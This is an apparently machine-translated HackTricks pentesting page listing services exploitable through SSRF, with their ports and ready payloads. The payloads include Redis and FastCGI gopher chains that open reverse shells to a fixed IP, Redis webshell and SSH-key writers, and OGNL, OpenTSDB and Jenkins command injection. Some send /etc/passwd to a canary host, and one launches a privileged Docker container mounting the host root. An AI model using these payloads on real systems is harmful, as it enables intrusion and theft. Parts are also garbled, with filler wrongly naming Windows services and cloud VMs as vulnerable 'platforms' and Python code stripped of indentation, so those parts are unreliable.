# SSRF易受攻击的平台

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

这一部分内容来自[https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/)

## Elasticsearch

**常用绑定端口：9200**

当Elasticsearch在内部部署时，通常不需要身份验证。

如果你遇到部分盲目的SSRF，可以确定状态码，请检查以下端点是否返回200：
```http
/_cluster/health
/_cat/indices
/_cat/health
```
如果你有一个盲目的SSRF，可以发送POST请求，你可以通过向以下路径发送POST请求来关闭Elasticsearch实例：

注意：`_shutdown` API已从Elasticsearch版本2.x及以上中删除。这仅适用于Elasticsearch 1.6及以下版本：
```http
/_shutdown
/_cluster/nodes/_master/_shutdown
/_cluster/nodes/_shutdown
/_cluster/nodes/_all/_shutdown
```
## Weblogic

**常见绑定端口：80、443（SSL）、7001、8888**

**SSRF金丝雀：UDDI Explorer（CVE-2014-4210）**
```http
POST /uddiexplorer/SearchPublicRegistries.jsp HTTP/1.1
Host: target.com
Content-Length: 137
Content-Type: application/x-www-form-urlencoded

operator=http%3A%2F%2FSSRF_CANARY&rdoSearch=name&txtSearchname=test&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
```
这个方法也适用于GET请求：
```bash
http://target.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http%3A%2F%2FSSRF_CANARY&rdoSearch=name&txtSearchname=test&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
```
此端点也容易受到CRLF注入攻击：
```
GET /uddiexplorer/SearchPublicRegistries.jsp?operator=http://attacker.com:4000/exp%20HTTP/1.11%0AX-CLRF%3A%20Injected%0A&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search HTTP/1.0
Host: vuln.weblogic
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
Connection: close
```
将导致以下请求：
```
root@mail:~# nc -lvp 4000
Listening on [0.0.0.0] (family 0, port 4000)
Connection from example.com 43111 received!
POST /exp HTTP/1.11
X-CLRF: Injected HTTP/1.1
Content-Type: text/xml; charset=UTF-8
soapAction: ""
Content-Length: 418
User-Agent: Java1.6.0_24
Host: attacker.com:4000
Accept: text/html, image/gif, image/jpeg, */*; q=.2
Connection: Keep-Alive

<?xml version="1.0" encoding="UTF-8" standalone="yes"?><env:Envelope xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><env:Header/><env:Body><find_business generic="2.0" xmlns="urn:uddi-org:api_v2"><name>sdf</name></find_business></env:Body></env:Envelope>
```
**SSRF金丝雀：CVE-2020-14883**

来自[这里](https://forum.90sec.com/t/topic/1412)。

Linux:
```http
POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: vulnerablehost:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 117

_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://SSRF_CANARY/poc.xml")
```
Windows:

Windows是一种广泛使用的操作系统，常用于个人电脑和服务器。它具有许多不同版本，包括Windows 7、Windows 8和Windows 10。在渗透测试中，我们可以利用Windows操作系统中的一些漏洞来执行SSRF攻击。以下是一些容易受到SSRF攻击的Windows平台：

- IIS（Internet Information Services）：IIS是Windows操作系统上的一种Web服务器。通过利用IIS的漏洞，我们可以在目标服务器上执行SSRF攻击。
- .NET框架：.NET框架是一种用于构建Windows应用程序的开发平台。在某些情况下，我们可以通过利用.NET框架的漏洞来实施SSRF攻击。
- Windows远程管理服务（RMS）：RMS是一种用于远程管理Windows服务器的服务。通过利用RMS的漏洞，我们可以在目标服务器上执行SSRF攻击。

了解这些容易受到SSRF攻击的Windows平台，可以帮助我们在渗透测试中更好地利用SSRF漏洞。
```http
POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: vulnerablehost:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 117

_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("http://SSRF_CANARY/poc.xml")
```
## Hashicorp Consul

**常见绑定端口：8500，8501（SSL）**

可以在[这里](https://www.kernelpicnic.net/2017/05/29/Pivoting-from-blind-SSRF-to-RCE-with-Hashicorp-Consul.html)找到详细说明。

## Shellshock

**常见绑定端口：80，443（SSL），8080**

为了有效地测试Shellshock，您可能需要添加一个包含有效载荷的头部。以下CGI路径值得尝试：

测试的CGI路径的简短列表：

[Gist包含路径](https://gist.github.com/infosec-au/009fcbdd5bad16bb6ceb36b838d96be4)。

**SSRF Canary：通过用户代理的Shellshock**
```bash
User-Agent: () { foo;}; echo Content-Type: text/plain ; echo ;  curl SSRF_CANARY
```
## Apache Druid

**常见绑定端口：80、8080、8888、8082**

查看Apache Druid的API参考文档[此处](https://druid.apache.org/docs/latest/operations/api-reference.html)。

如果您可以查看状态码，请检查以下路径，看它们是否返回200状态码：
```bash
/status/selfDiscovered/status
/druid/coordinator/v1/leader
/druid/coordinator/v1/metadata/datasources
/druid/indexer/v1/taskStatus
```
关闭任务，需要猜测任务ID或数据源名称：
```bash
/druid/indexer/v1/task/{taskId}/shutdown
/druid/indexer/v1/datasources/{dataSource}/shutdownAllTasks
```
关闭Apache Druid Overlords上的监督程序：
```bash
/druid/indexer/v1/supervisor/terminateAll
/druid/indexer/v1/supervisor/{supervisorId}/shutdown
```
## Apache Solr

**常见绑定端口：8983**

**SSRF金丝雀：Shards参数**

> 补充一下shubham所说的 - 扫描solr相对容易。有一个shards=参数，允许你反弹SSRF到SSRF来验证你是否盲目地攻击了一个solr实例。
>
> — Хавиж Наффи 🥕 (@nnwakelam) [2021年1月13日](https://twitter.com/nnwakelam/status/1349298311853821956?ref\_src=twsrc%5Etfw)

来源：[这里](https://github.com/veracode-research/solr-injection)
```bash
/search?q=Apple&shards=http://SSRF_CANARY/solr/collection/config%23&stream.body={"set-property":{"xxx":"yyy"}}
/solr/db/select?q=orange&shards=http://SSRF_CANARY/solr/atom&qt=/select?fl=id,name:author&wt=json
/xxx?q=aaa%26shards=http://SSRF_CANARY/solr
/xxx?q=aaa&shards=http://SSRF_CANARY/solr
```
**SSRF金丝雀：Solr XXE（2017）**

[Apache Solr 7.0.1 XXE（Packetstorm）](https://packetstormsecurity.com/files/144678/Apache-Solr-7.0.1-XXE-Injection-Code-Execution.html)
```bash
/solr/gettingstarted/select?q={!xmlparser v='<!DOCTYPE a SYSTEM "http://SSRF_CANARY/xxx"'><a></a>'
/xxx?q={!type=xmlparser v="<!DOCTYPE a SYSTEM 'http://SSRF_CANARY/solr'><a></a>"}
```
**通过dataImportHandler实现远程代码执行（RCE）**

[通过dataImportHandler实现远程代码执行的研究](https://github.com/veracode-research/solr-injection#3-cve-2019-0193-remote-code-execution-via-dataimporthandler)

## PeopleSoft

**常见绑定端口：80、443（SSL）**

取自此研究[链接](https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce)。

**SSRF Canary：XXE #1**
```http
POST /PSIGW/HttpListeningConnector HTTP/1.1
Host: website.com
Content-Type: application/xml
...

<?xml version="1.0"?>
<!DOCTYPE IBRequest [
<!ENTITY x SYSTEM "http://SSRF_CANARY">
]>
<IBRequest>
<ExternalOperationName>&x;</ExternalOperationName>
<OperationType/>
<From><RequestingNode/>
<Password/>
<OrigUser/>
<OrigNode/>
<OrigProcess/>
<OrigTimeStamp/>
</From>
<To>
<FinalDestination/>
<DestinationNode/>
<SubChannel/>
</To>
<ContentSections>
<ContentSection>
<NonRepudiation/>
<MessageVersion/>
<Data><![CDATA[<?xml version="1.0"?>your_message_content]]>
</Data>
</ContentSection>
</ContentSections>
</IBRequest>
```
# SSRF Canary: XXE #2

## Vulnerable Platforms

The following platforms are known to be vulnerable to Server-Side Request Forgery (SSRF) attacks using XML External Entity (XXE) injection:

1. **Workspace**: The Workspace platform allows users to import XML files, making it susceptible to XXE injection attacks. An attacker can craft a malicious XML file containing an external entity reference that points to an internal file, such as `/etc/passwd`, and trigger an SSRF attack to retrieve sensitive information.

2. **AWS EC2**: Amazon Web Services (AWS) Elastic Compute Cloud (EC2) instances can be vulnerable to SSRF attacks via XXE injection. By injecting a malicious XML file that references an internal file, an attacker can exploit the SSRF vulnerability to access sensitive data or perform unauthorized actions within the AWS environment.

3. **GCP Compute Engine**: Google Cloud Platform (GCP) Compute Engine instances are also susceptible to SSRF attacks through XXE injection. By injecting a malicious XML file with an external entity reference, an attacker can trigger an SSRF attack and potentially gain unauthorized access to sensitive information or perform malicious actions within the GCP environment.

4. **Azure Virtual Machines**: Microsoft Azure Virtual Machines can be vulnerable to SSRF attacks using XXE injection. By injecting a malicious XML file that references internal files, an attacker can exploit the SSRF vulnerability to retrieve sensitive data or perform unauthorized actions within the Azure environment.

## Mitigation

To mitigate the risk of SSRF attacks via XXE injection, it is recommended to follow these best practices:

1. **Input Validation**: Implement strict input validation to prevent the acceptance of malicious XML files or external entity references.

2. **XML Parsing Configuration**: Configure XML parsers to disable external entity resolution or limit the entities that can be resolved.

3. **Firewall Rules**: Implement firewall rules to restrict outgoing connections from the server, preventing SSRF attacks from reaching external resources.

4. **Least Privilege**: Ensure that the server or application has the least privilege necessary to perform its intended functions, reducing the potential impact of SSRF attacks.

5. **Security Updates**: Keep all software and libraries up to date with the latest security patches to mitigate known vulnerabilities.

By following these mitigation techniques, the risk of SSRF attacks via XXE injection can be significantly reduced.
```http
POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1
Host: website.com
Content-Type: application/xml
...

<!DOCTYPE a PUBLIC "-//B/A/EN" "http://SSRF_CANARY">
```
## Apache Struts

**常见绑定端口：80、443（SSL）、8080、8443（SSL）**

来自[这里](https://blog.safebuff.com/2016/07/03/SSRF-Tips/)。

**SSRF Canary: Struts2-016**：

将此附加到您所知道的每个内部端点/URL的末尾：
```http
?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'command'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d"http://SSRF_CANARY/result%3d".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod("GET"),%23http.connect(),%23http.getInputStream()}
```
## JBoss

**常见绑定端口：80、443（SSL）、8080、8443（SSL）**

来源：[这里](https://blog.safebuff.com/2016/07/03/SSRF-Tips/)。

**SSRF 金丝雀：从 URL 部署 WAR**
```bash
/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=17&arg0=http://SSRF_CANARY/utils/cmd.war
```
## Confluence

**常见绑定端口：80、443（SSL）、8080、8443（SSL）**

**SSRF金丝雀：Sharelinks（适用于2016年11月及之前发布的Confluence版本）**
```bash
/rest/sharelinks/1.0/link?url=https://SSRF_CANARY/
```
**SSRF金丝雀：iconUriServlet - Confluence < 6.1.3 (CVE-2017-9506)**

[Atlassian安全票据OAUTH-344](https://ecosystem.atlassian.net/browse/OAUTH-344)
```bash
/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
```
## Jira

**常见绑定端口：80、443（SSL）、8080、8443（SSL）**

**SSRF 金丝雀：iconUriServlet - Jira < 7.3.5（CVE-2017-9506）**

[Atlassian 安全票 OAUTH-344](https://ecosystem.atlassian.net/browse/OAUTH-344)
```bash
/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
```
**SSRF金丝雀：makeRequest - Jira < 8.4.0 (CVE-2019-8451)**

[Atlassian安全票务JRASERVER-69793](https://jira.atlassian.com/browse/JRASERVER-69793)
```bash
/plugins/servlet/gadgets/makeRequest?url=https://SSRF_CANARY:443@example.com
```
## 其他 Atlassian 产品

**常见绑定端口：80、443（SSL）、8080、8443（SSL）**

**SSRF 金丝雀：iconUriServlet（CVE-2017-9506）**：

* Bamboo < 6.0.0
* Bitbucket < 4.14.4
* Crowd < 2.11.2
* Crucible < 4.3.2
* Fisheye < 4.3.2

[Atlassian 安全票 OAUTH-344](https://ecosystem.atlassian.net/browse/OAUTH-344)
```bash
/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
```
## OpenTSDB

**常见绑定端口：4242**

[OpenTSDB远程代码执行](https://packetstormsecurity.com/files/136753/OpenTSDB-Remote-Code-Execution.html)

**SSRF金丝雀：通过RCE进行curl**
```bash
/q?start=2016/04/13-10:21:00&ignore=2&m=sum:jmxdata.cpu&o=&yrange=[0:]&key=out%20right%20top&wxh=1900x770%60curl%20SSRF_CANARY%60&style=linespoint&png
```
[OpenTSDB 2.4.0 远程代码执行](https://github.com/OpenTSDB/opentsdb/issues/2051)

**SSRF 金丝雀：通过 RCE 进行 curl - CVE-2020-35476**
```bash
/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system('wget%20--post-file%20/etc/passwd%20SSRF_CANARY')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json
```
## Jenkins

**常见绑定端口：80、443（SSL）、8080、8888**

[这里](https://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html)有一篇很棒的文章。

**SSRF 金丝雀：CVE-2018-1000600**
```bash
/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://SSRF_CANARY/%23&login=orange&password=tsai
```
**RCE**

按照这里的指示通过GET实现RCE：[Hacking Jenkins Part 2 - 滥用元编程实现未经身份验证的RCE！](https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html)
```bash
/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name='orange.tw', root='http://SSRF_CANARY/')%0a@Grab(group='tw.orange', module='poc', version='1')%0aimport Orange;
```
**通过Groovy实现远程命令执行（RCE）**

In some cases, Server-Side Request Forgery (SSRF) vulnerabilities can be exploited to achieve Remote Code Execution (RCE) by injecting malicious Groovy code. This technique is particularly effective when the target application uses Groovy as a scripting language.

在某些情况下，可以利用服务器端请求伪造（SSRF）漏洞来注入恶意的Groovy代码，从而实现远程命令执行（RCE）。当目标应用程序使用Groovy作为脚本语言时，这种技术特别有效。

To exploit this vulnerability, an attacker can craft a malicious request that triggers the SSRF vulnerability and inject Groovy code to execute arbitrary commands on the server. The injected code can be executed within the context of the server-side application, allowing the attacker to gain unauthorized access and perform various malicious actions.

为了利用这个漏洞，攻击者可以构造一个恶意请求来触发SSRF漏洞，并注入Groovy代码以在服务器上执行任意命令。注入的代码可以在服务器端应用程序的上下文中执行，使攻击者能够未经授权地访问并执行各种恶意操作。

To prevent RCE via Groovy, it is important to properly validate and sanitize user-supplied input before using it in SSRF-prone functions or APIs. Additionally, it is recommended to restrict the access of the server-side application to sensitive resources and limit the execution privileges of the server-side code.

为了防止通过Groovy实现远程命令执行，重要的是在使用可能存在SSRF的函数或API之前，正确验证和清理用户提供的输入。此外，建议限制服务器端应用程序对敏感资源的访问，并限制服务器端代码的执行权限。
```
cmd = 'curl burp_collab'
pay = 'public class x {public x(){"%s".execute()}}' % cmd
data = 'http://jenkins.internal/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=' + urllib.quote(pay)
```
## Hystrix 仪表板

**常见绑定端口：80、443（SSL）、8080**

Spring Cloud Netflix，版本 2.2.x 在 2.2.4 之前，版本 2.1.x 在 2.1.6 之前。

**SSRF 金丝雀：CVE-2020-5412**
```bash
/proxy.stream?origin=http://SSRF_CANARY/
```
## W3 Total Cache

**常见绑定端口：80、443（SSL）**

W3 Total Cache 0.9.2.6-0.9.3

**SSRF 金丝雀：CVE-2019-6715**

这需要是一个 PUT 请求：
```bash
PUT /wp-content/plugins/w3-total-cache/pub/sns.php HTTP/1.1
Host: {{Hostname}}
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36
Content-Length: 124
Content-Type: application/x-www-form-urlencoded
Connection: close

{"Type":"SubscriptionConfirmation","Message":"","SubscribeURL":"https://SSRF_CANARY"}
```
**SSRF金丝雀**

此漏洞的公告在此处发布：[W3 Total Cache SSRF漏洞](https://klikki.fi/adv/w3\_total\_cache.html)

此PHP代码将为您的SSRF金丝雀主机生成有效载荷（将`url`替换为您的金丝雀主机）：
```php
<?php

$url='http://www.google.com';
$file=strtr(base64_encode(gzdeflate($url.'#https://ajax.googleapis.com')), '+/=', '-_');
$file=chop($file,'=');
$req='/wp-content/plugins/w3-total-cache/pub/minify.php?file='.$file.'.css';
echo($req);

?>
```
## Docker

**常见绑定端口：2375，2376（SSL）**

如果你遇到部分盲的SSRF，你可以使用以下路径来验证Docker API的存在：
```bash
/containers/json
/secrets
/services
```
**通过运行任意的Docker镜像实现远程命令执行（RCE）**

在某些情况下，SSRF漏洞可能导致远程命令执行（RCE）。这种情况下，攻击者可以利用SSRF漏洞来运行恶意的Docker镜像，从而在目标服务器上执行任意命令。

以下是一些容易受到此类攻击的平台和框架：

- Docker：如果目标服务器上的Docker守护程序未经适当配置，攻击者可以通过SSRF漏洞来运行恶意的Docker镜像，并在目标服务器上执行任意命令。

- Kubernetes：类似于Docker，如果Kubernetes集群未经适当配置，攻击者可以通过SSRF漏洞来运行恶意的容器，并在集群中执行任意命令。

- OpenStack：OpenStack是一个开源的云计算平台，如果存在SSRF漏洞，攻击者可以通过发送恶意请求来运行任意命令。

- AWS EC2 Metadata Service：AWS EC2实例上的元数据服务是一种用于获取实例元数据的服务。如果存在SSRF漏洞，攻击者可以通过发送恶意请求来获取敏感信息或执行任意命令。

- GCP Metadata Service：类似于AWS EC2 Metadata Service，GCP实例上的元数据服务也可能受到SSRF漏洞的影响，从而导致远程命令执行。

- Azure Instance Metadata Service：Azure虚拟机上的实例元数据服务也可能受到SSRF漏洞的影响，攻击者可以通过发送恶意请求来获取敏感信息或执行任意命令。

要防止此类攻击，建议在使用这些平台和框架时采取以下措施：

- 配置Docker和Kubernetes以限制容器的权限和资源使用。
- 在OpenStack中实施严格的访问控制策略，限制对敏感功能和API的访问。
- 在AWS EC2实例上使用安全组和网络访问控制列表（NACL）来限制对元数据服务的访问。
- 在GCP实例上使用防火墙规则来限制对元数据服务的访问。
- 在Azure虚拟机上使用网络安全组来限制对实例元数据服务的访问。

通过采取这些措施，可以减少SSRF漏洞导致的远程命令执行的风险。
```http
POST /containers/create?name=test HTTP/1.1
Host: website.com
Content-Type: application/json
...

{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}
```
将alpine替换为您希望Docker容器运行的任意镜像。

## Gitlab Prometheus Redis Exporter

**常见绑定端口：9121**

此漏洞影响Gitlab版本13.1.1之前的实例。根据[Gitlab文档](https://docs.gitlab.com/ee/administration/monitoring/prometheus/#configuring-prometheus)的说明，`从GitLab 9.0开始，默认启用Prometheus及其导出器`。

这些导出器为攻击者提供了一个绝佳的方法，可以使用CVE-2020-13379来转向并攻击其他服务。其中一个容易受到攻击的导出器是Redis导出器。

通过以下端点，攻击者可以通过目标参数来转储redis服务器中的所有键：
```bash
http://localhost:9121/scrape?target=redis://127.0.0.1:7001&check-keys=*
```
***

**通过Gopher可能实现**

## Redis

**常见绑定端口：6379**

推荐阅读：

* [尝试通过HTTP请求来攻击Redis](https://www.agarri.fr/blog/archives/2014/09/11/trying\_to\_hack\_redis\_via\_http\_requests/index.html)
* [针对Redis的SSRF攻击](https://maxchadwick.xyz/blog/ssrf-exploits-against-redis)

**通过Cron实现远程命令执行（RCE）** - [Gopher攻击面](https://blog.chaitin.cn/gopher-attack-surfaces/)
```bash
redis-cli -h $1 flushall
echo -e "\n\n*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1\n\n"|redis-cli -h $1 -x set 1
redis-cli -h $1 config set dir /var/spool/cron/
redis-cli -h $1 config set dbfilename root
redis-cli -h $1 save
```
Gopher（又称地鼠协议）：
```bash
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
```
**通过Shell上传实现远程命令执行（PHP）** - [Redis Getshell概述](https://www.mdeditor.tw/pl/pBy0)
```python
#!/usr/bin/env python
# -*-coding:utf-8-*-

import urllib
protocol="gopher://"
ip="192.168.189.208"
port="6379"
shell="\n\n<?php phpinfo();?>\n\n"
filename="shell.php"
path="/var"
passwd=""

cmd=["flushall",
"set 1 {}".format(shell.replace(" ","${IFS}")),
"config set dir {}".format(path),
"config set dbfilename {}".format(filename),
"save"
]
if passwd:
cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
CRLF="\r\n"
redis_arr = arr.split(" ")
cmd=""
cmd+="*"+str(len(redis_arr))
for x in redis_arr:
cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
cmd+=CRLF
return cmd

if __name__=="__main__":
for x in cmd:
payload += urllib.quote(redis_format(x))
print payload
```
**通过 authorized\_keys 进行远程命令执行（RCE）** - [Redis Getshell 概述](https://www.mdeditor.tw/pl/pBy0)
```python
import urllib
protocol="gopher://"
ip="192.168.189.208"
port="6379"
# shell="\n\n<?php eval($_GET[\"cmd\"]);?>\n\n"
sshpublic_key = "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8IOnJUAt5b/5jDwBDYJTDULjzaqBe2KW3KhqlaY58XveKQRBLrG3ZV0ffPnIW5SLdueunb4HoFKDQ/KPXFzyvVjqByj5688THkq1RJkYxGlgFNgMoPN151zpZ+eCBdFZEf/m8yIb3/7Cp+31s6Q/DvIFif6IjmVRfWXhnkjNehYjsp4gIEBiiW/jWId5yrO9+AwAX4xSabbxuUyu02AQz8wp+h8DZS9itA9m7FyJw8gCrKLEnM7PK/ClEBevDPSR+0YvvYtnUxeCosqp9VrjTfo5q0nNg9JAvPMs+EA1ohUct9UyXbTehr1Bdv4IXx9+7Vhf4/qwle8HKali3feIZ root@kali\n\n"
filename="authorized_keys"
path="/root/.ssh/"
passwd=""
cmd=["flushall",
"set 1 {}".format(sshpublic_key.replace(" ","${IFS}")),
"config set dir {}".format(path),
"config set dbfilename {}".format(filename),
"save"
]
if passwd:
cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
CRLF="\r\n"
redis_arr = arr.split(" ")
cmd=""
cmd+="*"+str(len(redis_arr))
for x in redis_arr:
cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
cmd+=CRLF
return cmd

if __name__=="__main__":
for x in cmd:
payload += urllib.quote(redis_format(x))
print payload
```
**通过Git协议在GitLab上实现远程代码执行（RCE）**

来自Liveoverflow的精彩解读[在这里](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/)。

虽然这需要对GitLab进行身份验证才能利用，但我在这里包含了有效载荷，因为`git`协议可能适用于您正在攻击的目标。此有效载荷仅供参考。
```bash
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git
```
## Memcache

**常见绑定端口：11211**

* [vBulletin Memcache RCE](https://www.exploit-db.com/exploits/37815)
* [GitHub Enterprise Memcache RCE](https://www.exploit-db.com/exploits/42392)
* [Memcache的Gopher负载示例](https://blog.safebuff.com/2016/07/03/SSRF-Tips/#SSRF-memcache-Getshell)
```bash
gopher://[target ip]:11211/_%0d%0aset ssrftest 1 0 147%0d%0aa:2:{s:6:"output";a:1:{s:4:"preg";a:2:{s:6:"search";s:5:"/.*/e";s:7:"replace";s:33:"eval(base64_decode($_POST[ccc]));";}}s:13:"rewritestatus";i:1;}%0d%0a
gopher://192.168.10.12:11211/_%0d%0adelete ssrftest%0d%0a
```
## Apache Tomcat

**常见绑定端口：80、443（SSL）、8080、8443（SSL）**

仅适用于Tomcat 6：

[gopher-tomcat-deployer](https://github.com/pimps/gopher-tomcat-deployer)

使用此技术的CTF解析：

[从XXE到RCE：Pwn2Win CTF 2018解析](https://bookgin.tw/2018/12/04/from-xxe-to-rce-pwn2win-ctf-2018-writeup/)

## FastCGI

**常见绑定端口：80、443（SSL）**

此内容来自[这里](https://blog.chaitin.cn/gopher-attack-surfaces/)。
```bash
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/172.19.23.228/2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00
```
## Java RMI

**常见绑定端口：1090、1098、1099、1199、4443-4446、8999-9010、9999**

